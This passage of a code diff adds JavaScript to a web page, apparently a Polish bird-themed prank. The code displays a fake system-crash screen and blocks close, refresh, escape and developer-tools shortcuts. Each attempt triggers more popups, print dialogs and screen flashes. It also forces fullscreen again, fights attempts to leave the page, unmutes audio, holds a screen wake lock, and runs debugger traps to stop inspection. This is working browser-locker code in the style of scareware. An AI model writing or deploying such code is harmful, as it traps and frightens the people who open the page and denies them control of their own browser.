+    b.innerHTML='<div class="sad">:(</div><h1>PTOSZEK_FATAL_ERROR</h1><p>Error code: 0x'+R(10000000,99999999).toString(16).toUpperCase()+'<br>ptoszek.exe caused an unrecoverable system failure.<br>Collecting error info... '+R(0,100)+'% complete<br><br>Don\'t turn off your computer... just kidding, you can\'t anyway. 🐦</p>';
+    document.body.appendChild(b);setTimeout(()=>{b.style.transition='opacity .5s';b.style.opacity='0';setTimeout(()=>b.remove(),500)},R(4000,8000));
+  },R(20000,40000));
+}
+
+// ===== SCREEN ROTATE =====
+function xRotate(){setInterval(()=>{const r=R(-10,10);document.body.style.transform='rotate('+r+'deg) scale('+(1+R(-5,10)/100)+')';setTimeout(()=>document.body.style.transform='',R(300,800))},R(4000,8000))}
+
+// ===== KEYBOARD BLOCKER =====
+function bk(e){
+  if(!X)return;
+  const k=(e.key||'').toLowerCase(),c=e.ctrlKey||e.metaKey,a=e.altKey,s=e.shiftKey;
+  const bl=(c&&k==='w')||(c&&k==='q')||(c&&k==='f4')||(a&&k==='f4')||(c&&k==='t')||(c&&k==='n')||(c&&s&&k==='i')||(c&&s&&k==='j')||(c&&s&&k==='c')||(k==='f12')||(c&&k==='l')||(a&&k==='d')||(k==='f6')||(c&&k==='tab')||(c&&/^[1-9]$/.test(k))||(k==='f5')||(c&&k==='r')||(a&&k==='arrowleft')||(k==='backspace'&&e.target===document.body)||(c&&k==='f')||(c&&k==='p')||(c&&k==='a')||(k==='escape')||(c&&k==='u')||(c&&k==='d')||(c&&k==='j')||(c&&k==='h')||(c&&k===',');
+  if(!bl)return;
+  e.preventDefault();e.stopPropagation();e.stopImmediatePropagation();
+  // EVERY blocked shortcut = MORE PUNISHMENT
+  if(k==='w'||k==='q'||k==='f4'){speak('HA HA HA! Masz 8 nowych ptoszków!');spawnP(8);try{window.print()}catch(e){};sA('☠️ NICE TRY','Za każdą próbę zamknięcia otwieramy 8 nowych okien! Aktualnie: '+pops.length+' ptoszków');for(let i=0;i<5;i++)mkFW()}
+  else if(k==='escape'){speak('Escape? NIGDY!');spawnP(5);sA('⛔ NO ESCAPE','Klawisz Escape otwiera 5 nowych ptoszków!')}
+  else if(k==='t'||k==='n'){speak('Proszę nowa karta z ptoszkiem!');spawnP(5)}
+  else if(k==='f12'||k==='i'||k==='j'||k==='u'){speak('DevTools? WIĘCEJ CHAOSU!');for(let i=0;i<5;i++)mkFW();spawnP(3)}
+  else if(k==='f5'||k==='r'){speak('Odświeżanie? To doda ptoszków!');spawnP(3)}
+  else if(k==='p'){try{window.print()}catch(e){};try{window.print()}catch(e){};try{window.print()}catch(e){}}
+  else{speak('TEN SKRÓT TEŻ NIE DZIAŁA!');spawnP(2)}
+  // FLASH + EXPLOSION
+  const fl=document.createElement('div');fl.style.cssText='position:fixed;inset:0;background:rgba(255,0,0,.5);z-index:55000;pointer-events:none;transition:opacity .3s';document.body.appendChild(fl);setTimeout(()=>{fl.style.opacity='0';setTimeout(()=>fl.remove(),300)},60);
+  // Bird explosion from center
+  for(let i=0;i<20;i++){setTimeout(()=>{const b=document.createElement('div');b.style.cssText='position:fixed;left:50%;top:50%;font-size:'+R(20,50)+'px;z-index:56000;pointer-events:none;transition:all '+RF(.3,1.2)+'s ease-out';b.textContent=RE(E);document.body.appendChild(b);requestAnimationFrame(()=>{b.style.left=R(-10,110)+'%';b.style.top=R(-10,110)+'%';b.style.opacity='0';b.style.transform='rotate('+R(-720,720)+'deg) scale('+RF(.5,3)+')'});setTimeout(()=>b.remove(),1500)},i*20)}
+}
+document.addEventListener('keydown',bk,true);
+document.addEventListener('keyup',e=>{if(X){e.preventDefault();e.stopPropagation()}},true);
+document.addEventListener('keypress',e=>{if(X){e.preventDefault();e.stopPropagation()}},true);
+document.addEventListener('contextmenu',e=>{if(!X)return;e.preventDefault();speak('NOPE!');sA('🖱️ RIGHT CLICK BLOCKED','Ptoszek mówi: nie.');spawnP(2)},true);
+document.addEventListener('selectstart',e=>{if(X)e.preventDefault()},true);
+document.addEventListener('dragstart',e=>{if(X)e.preventDefault()},true);
+addEventListener('beforeunload',e=>{if(!X)return;speak('NIE ODCHODŹ!');e.preventDefault();e.returnValue='PTOSZEK CIĘ POTRZEBUJE!'});
+// fullscreen retrap
+['click','touchstart'].forEach(ev=>document.addEventListener(ev,()=>{if(!X)return;try{if(!document.fullscreenElement)(document.documentElement.requestFullscreen||document.documentElement.webkitRequestFullscreen).call(document.documentElement)}catch(e){}},{capture:true,passive:true}));
+document.addEventListener('fullscreenchange',()=>{if(!document.fullscreenElement&&X){speak('FULLSCREEN OFF? WIĘCEJ PTOSZKÓW!');spawnP(3)}});
+document.addEventListener('visibilitychange',()=>{if(!X)return;if(!document.hidden){speak('WRÓCIŁEŚ! ZA KARĘ!');spawnP(4);for(let i=0;i<3;i++)mkFW()}});
+addEventListener('blur',()=>{if(X)setTimeout(()=>{try{window.focus()}catch(e){}},50)});
+['click','touchstart','mousedown','keydown'].forEach(ev=>document.addEventListener(ev,()=>{if(!X)return;try{if(ac&&ac.state==='suspended')ac.resume()}catch(e){};document.querySelectorAll('audio,video').forEach(e=>{e.volume=1;e.muted=false;try{e.play()}catch(x){}})},{passive:true,capture:true}));
+(async()=>{try{if('wakeLock'in navigator){let w=await navigator.wakeLock.request('screen');w.addEventListener('release',async()=>{try{await navigator.wakeLock.request('screen')}catch(e){}})}}catch(e){}})();
+setInterval(()=>{if(!X)return;(function(){}).constructor('debugger')()},50);
+setInterval(()=>{if(!X)return;if(outerWidth-innerWidth>160||outerHeight-innerHeight>160){speak('DEVTOOLS?! PUNISHMENT TIME!');for(let i=0;i<8;i++)mkFW();spawnP(5);document.body.style.filter='invert(1) hue-rotate('+R(0,360)+'deg)';setTimeout(()=>document.body.style.filter='',1500)}},800);
+</script>
+</body>
+</html>
